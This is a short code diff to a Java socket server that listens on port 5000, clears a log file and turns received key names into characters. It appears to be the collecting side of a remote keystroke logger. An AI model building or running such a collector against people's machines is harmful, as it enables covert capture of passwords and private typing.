@@ -8,15 +8,13 @@ import java.util.Arrays;
 
 public class Server {
     String[] keys = {"alt", "tab", "shift", "escape", "backspace", "caps lock", "ctrl", "Win", "backslash", "up", "down", "right", "left"};
-    String[] english = "q w e r t y u i o p [ ] a s d f g h j k l ; ' z x c v b n m , .".split(" ");
-    String[] russian = "й ц у к е н г ш щ з х ъ ф ы в а п р о л д ж э я ч с м и т ь б ю".split(" ");
     public void connect(){
         try {
             ServerSocket serversocket = new ServerSocket(5000);
+            System.out.println("Server started, waiting for connections");
             clearTheFile();
             while (true){
                 Socket socket = serversocket.accept();
-               // LOGGER.log(Level.INFO, format("%s %s", "connecting to ... " , socket.getLocalAddress()));
                 System.out.println("connecting to ... " + socket.getLocalAddress());
                 System.out.println("---------------------------------------------------");
                 System.out.println("SUCCESSFUL CONNECTION");
@@ -49,7 +47,7 @@ public class Server {
     public static void main(String[] args) {
         new Server().connect();
     }
-    public static void clearTheFile() throws IOException {
+    public void clearTheFile() throws IOException {
         FileWriter file = new FileWriter("test.txt", false);
         PrintWriter rewrite = new PrintWriter(file, false);
         rewrite.flush();
@@ -80,6 +78,8 @@ public class Server {
                 break;
             case "period": message = ".";
                 break;
+            case "back quote": message = "`";
+                break;
             default:
                 break;
         }
@@ -90,8 +90,5 @@ public class Server {
             message =" [" + message + "] ";
         }
         return message;
-    }
-    public static void optimization(String message){
-        
     }
 }
